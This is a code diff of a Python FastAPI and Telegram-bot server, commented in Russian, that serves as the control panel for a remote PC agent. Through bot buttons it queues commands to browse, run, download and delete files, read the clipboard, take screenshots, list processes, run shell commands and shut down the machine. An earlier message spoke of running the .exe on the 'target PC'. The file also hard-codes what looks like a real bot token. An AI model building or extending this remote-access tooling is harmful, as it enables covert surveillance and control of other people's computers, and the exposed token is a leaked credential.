@@ -2,10 +2,10 @@ import os
 import asyncio
 import logging
 import base64
+import uvicorn  # Добавили импорт uvicorn для правильного старта
 from contextlib import asynccontextmanager
 from fastapi import FastAPI, Request
 from fastapi.responses import JSONResponse
-from pydantic import BaseModel
 from aiogram import Bot, Dispatcher, types
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
 from aiogram.filters import Command
@@ -13,8 +13,8 @@ from aiogram.filters import Command
 # Настройка логирования
 logging.basicConfig(level=logging.INFO)
 
-# Твой рабочий токен
 TOKEN = "8889355917:AAEPQcy1eLySvKBQgkOM23tANZoIpR3VU34"
+# Рендер автоматически выдает этот URL. Если тестируешь локально, используй ngrok
 RENDER_URL = os.getenv("RENDER_EXTERNAL_URL", "https://YOUR_DOMAIN.onrender.com")
 
 bot = Bot(token=TOKEN)
@@ -23,13 +23,7 @@ dp = Dispatcher()
 # Глобальные хранилища данных
 active_hosts = {}   # host_id -> data
 user_sessions = {}  # uid -> data
-last_processed_reports = {}  # host_id -> last_report_text (Защита от дублирования сообщений)
-
-# Модель данных для эндпоинта авторизации (из Tkinter окна)
-class AuthRequest(BaseModel):
-    host_id: str
-    tg_id: str
-    code: str
+last_processed_reports = {}  # host_id -> last_report_text
 
 @asynccontextmanager
 async def lifespan(app: FastAPI):
@@ -50,7 +44,7 @@ def get_file_manager_keyboard(items, current_dir):
     folders = [x for x in items if x.get("type") == "folder"]
     files = [x for x in items if x.get("type") == "file"]
     
-    # Ограничиваем до 30, чтобы не упереться в лимиты Telegram по кнопкам
+    # Ограничиваем вывод, чтобы кнопки не уперлись в лимиты Telegram (макс 100 кнопок)
     for folder in folders[:30]:
         name = folder.get("name", "")
         keyboard.append([InlineKeyboardButton(text=f"📁 {name}", callback_data=f"cd_{name}")])
@@ -74,32 +68,6 @@ def get_file_manager_keyboard(items, current_dir):
     
     return InlineKeyboardMarkup(inline_keyboard=keyboard)
 
-# === НОВЫЙ ЭНДПОИНТ АВТОРИЗАЦИИ (ДЛЯ ОКНА AGENT.PY) ===
-@app.post("/auth")
-async def auth_endpoint(data: AuthRequest):
-    try:
-        uid = int(data.tg_id)
-        host_id = data.host_id
-        
-        # Принудительно регистрируем/линкуем хост за пользователем
-        if host_id not in active_hosts:
-            active_hosts[host_id] = {"owner_id": uid, "status": "online", "commands": []}
-        
-        if uid not in user_sessions:
-            user_sessions[uid] = {}
-        user_sessions[uid]["current_host"] = host_id
-        
-        # Отправляем подтверждение в Telegram
-        await bot.send_message(
-            chat_id=uid, 
-            text=f"🟢 *Устройство успешно авторизовано!*\n💻 Хост: `{host_id}`\n\nОтправь /start, чтобы открыть панель управления.", 
-            parse_mode="Markdown"
-        )
-        return {"status": "success"}
-    except Exception as e:
-        logging.error(f"Ошибка в /auth: {e}")
-        return JSONResponse(status_code=500, content={"error": str(e)})
-
 # Эндпоинт связи с агентом на ПК (Poll)
 @app.post("/poll")
 async def poll(request: Request):
@@ -113,7 +81,7 @@ async def poll(request: Request):
     
     if not host_id or not uid: 
         return {"commands": [], "clear_report": False}
-        
+    
     uid = int(uid)
     
     # Регистрация или обновление хоста в сети
@@ -138,8 +106,8 @@ async def poll(request: Request):
         last_report = last_processed_reports.get(host_id, "")
         
         if text_str != last_report:
-            last_processed_reports[host_id] = text_str  # Запоминаем текущий репорт
-            should_clear_report = True                  # Даем агенту команду стереть статус
+            last_processed_reports[host_id] = text_str  
+            should_clear_report = True                  
             
             async def send_and_delete_report(chat_id, report_text):
                 try:
@@ -158,7 +126,7 @@ async def poll(request: Request):
                         except Exception:
                             pass
                 except Exception as e:
-                    logging.error(f"Ошибка удаления: {e}")
+                    logging.error(f"Ошибка удаления сообщения: {e}")
 
             asyncio.create_task(send_and_delete_report(uid, text_str))
         else:
@@ -204,7 +172,7 @@ async def poll(request: Request):
             except Exception:
                 pass
 
-    # Забираем накопившиеся команды
+    # Отдаем команды агенту
     commands = active_hosts[host_id].get("commands", [])
     active_hosts[host_id]["commands"] = [] 
     
@@ -216,6 +184,7 @@ async def start_cmd(message: types.Message):
     uid = message.from_user.id
     user_sessions[uid] = {"state": None, "last_msg_id": None}
     
+    # Ищем, нет ли уже онлайн-хоста для этого юзера
     target_host = None
     for hid, data in active_hosts.items():
         if data.get("owner_id") == uid:
@@ -226,20 +195,21 @@ async def start_cmd(message: types.Message):
         user_sessions[uid]["current_host"] = target_host
         kb = get_file_manager_keyboard(active_hosts[target_host]["items"], active_hosts[target_host]["current_dir"])
         msg = await message.answer(
-            text=f"💻 **Хост:** `{target_host}`\n📁 **Текущий путь:** `{active_hosts[target_host]['current_dir']}`",
+            text=f"💻 **Хост найден в сети:** `{target_host}`\n📁 **Путь:** `{active_hosts[target_host]['current_dir']}`",
             reply_markup=kb,
             parse_mode="Markdown"
         )
         user_sessions[uid]["last_msg_id"] = msg.message_id
     else:
-        await message.answer("👋 Ожидаю подключения твоего PC-агента... Запусти .exe на целевом ПК.")
+        await message.answer("👋 Привет! Твой ПК пока оффлайн. Запусти скрипт-агент на компьютере.")
 
 # Хэндлер для отправки консольных команд
 @dp.message()
 async def handle_text_messages(message: types.Message):
     uid = message.from_user.id
-    host_id = user_sessions.get(uid, {}).get("current_host")
-    state = user_sessions.get(uid, {}).get("state")
+    session = user_sessions.get(uid, {})
+    host_id = session.get("current_host")
+    state = session.get("state")
     
     if not host_id or host_id not in active_hosts:
         await message.answer("❌ Нет активного подключения к ПК. Запусти агент.")
@@ -255,7 +225,8 @@ async def handle_text_messages(message: types.Message):
 @dp.callback_query()
 async def handle_callbacks(callback: types.CallbackQuery):
     uid = callback.from_user.id
-    host_id = user_sessions.get(uid, {}).get("current_host")
+    session = user_sessions.get(uid, {})
+    host_id = session.get("current_host")
     
     if not host_id or host_id not in active_hosts:
         await callback.answer("❌ Активный ПК не найден или оффлайн.", show_alert=True)
@@ -267,7 +238,7 @@ async def handle_callbacks(callback: types.CallbackQuery):
     if data.startswith("cd_"):
         folder_name = data.replace("cd_", "")
         active_hosts[host_id]["commands"].append({"type": "cd", "param": folder_name})
-        await callback.answer("Запрос на смену папки...")
+        await callback.answer("Смена папки...")
         
     elif data.startswith("file_"):
         file_name = data.replace("file_", "")
@@ -293,19 +264,19 @@ async def handle_callbacks(callback: types.CallbackQuery):
     elif data.startswith("run_"):
         f_name = data.replace("run_", "")
         active_hosts[host_id]["commands"].append({"type": "run_file", "param": f_name})
-        await callback.answer("Запрос на запуск отправлен...")
+        await callback.answer("Запуск файла...")
         
     elif data.startswith("download_"):
         f_name = data.replace("download_", "")
         active_hosts[host_id]["commands"].append({"type": "download_file", "param": f_name})
-        await callback.answer("Скачиваю файл...")
+        await callback.answer("Скачивание...")
 
     elif data.startswith("delete_"):
         f_name = data.replace("delete_", "")
         active_hosts[host_id]["commands"].append({"type": "delete_file", "param": f_name})
-        await callback.answer("Удаляю файл...")
+        await callback.answer("Удаление...")
 
-    elif data == "back_to_manager":
+    elif data.startswith("back_to_manager"):
         kb = get_file_manager_keyboard(active_hosts[host_id]["items"], active_hosts[host_id]["current_dir"])
         await bot.edit_message_text(
             chat_id=uid,
@@ -318,15 +289,15 @@ async def handle_callbacks(callback: types.CallbackQuery):
         
     elif data == "show_processes":
         active_hosts[host_id]["commands"].append({"type": "get_processes"})
-        await callback.answer("Запрашиваю список процессов...")
+        await callback.answer("Запрос процессов...")
         
     elif data == "get_clipboard":
         active_hosts[host_id]["commands"].append({"type": "get_clipboard"})
-        await callback.answer("Читаю буфер обмена...")
+        await callback.answer("Чтение буфера...")
 
     elif data == "take_screenshot":
         active_hosts[host_id]["commands"].append({"type": "screenshot"})
-        await callback.answer("Делаю снимок экрана...")
+        await callback.answer("Снимок экрана...")
 
     elif data == "run_cmd":
         user_sessions[uid]["state"] = "awaiting_cmd"
@@ -335,15 +306,23 @@ async def handle_callbacks(callback: types.CallbackQuery):
 
     elif data == "pc_shutdown":
         active_hosts[host_id]["commands"].append({"type": "shutdown"})
-        await callback.answer("Команда на выключение ПК отправлена!", show_alert=True)
+        await callback.answer("Команда на выключение отправлена!", show_alert=True)
 
-# Роут для вебхука Telegram
+# Точка входа для вебхуков Telegram
 @app.post("/webhook")
 async def webhook_endpoint(request: Request):
     try:
-        update = types.Update.model_validate(await request.json(), context={"bot": bot})
+        json_data = await request.json()
+        update = types.Update.model_validate(json_data, context={"bot": bot})
         await dp.feed_update(bot, update)
         return {"status": "ok"}
     except Exception as e:
-        logging.error(f"Ошибка вебхука: {e}")
+        logging.error(f"Ошибка в эндпоинте вебхука: {e}")
         return JSONResponse(status_code=500, content={"error": str(e)})
+
+# === ДОБАВЛЕННЫЙ БЛОК ДЛЯ СТАРТА НА RENDER ===
+if __name__ == "__main__":
+    # Динамически получаем порт из переменной среды хостинга, по дефолту ставим 8000
+    port = int(os.getenv("PORT", 8000))
+    # Запускаем сервер на 0.0.0.0, чтобы он принимал входящие запросы
+    uvicorn.run("server:app", host="0.0.0.0", port=port)
